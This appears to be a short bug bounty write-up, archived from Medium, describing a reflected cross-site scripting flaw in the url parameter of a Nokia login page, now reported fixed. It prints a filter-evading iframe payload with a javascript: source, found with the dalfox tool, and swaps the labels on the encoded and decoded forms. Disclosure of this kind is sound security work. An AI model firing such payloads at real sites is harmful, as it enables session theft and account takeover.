# How do I get cross site scripting(“xss”) in “Nokia”

- **Source URL:** https://medium.com/@elsayedmohammed/how-do-i-get-cross-site-scripting-xss-in-nokia-3041c942b923?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20230416145038/https://medium.com/@elsayedmohammed/how-do-i-get-cross-site-scripting-xss-in-nokia-3041c942b923
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/2385 (id 2385)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# How do I get cross site scripting(“xss”) in “Nokia”

This is my first and last Bug Bounty Writeup this year. 😀

I am sharing with you my latest XSS finding.

- I’ve checked that XSS and confirmed that it was fixed properly.
- The specific endpoint had `url` a param that was vulnerable to Reflected XSS injection.

`---------.nokia.com/login/login.jsp?url=test` I’ve started to search for a bypass and used the Search function in Chrome Developer tools to search this endpoint `/login` in all JS files to check for another vulnerable param, but found another endpoint:

using tool dalfox and help me to bypass than done

`---------.nokia.com/login/login.jsp?url="%26%23x27%3B><iFrAme%2Fsrc%3DjaVascRipt%3Aconfirm("hackedbyshari7a0x")><%2FiFramE>`
payload

decoded = “%26%23x27%3B>\<iFrAme%2Fsrc%3DjaVascRipt%3Aconfirm(“hackedbyshari7a0x”)>\<%2FiFramE>

coded = “”'>\<iFrAme/src=jaVascRipt:confirm(“hackedbyshari7a0x”) >\</iFrAme>

thanks for reading .
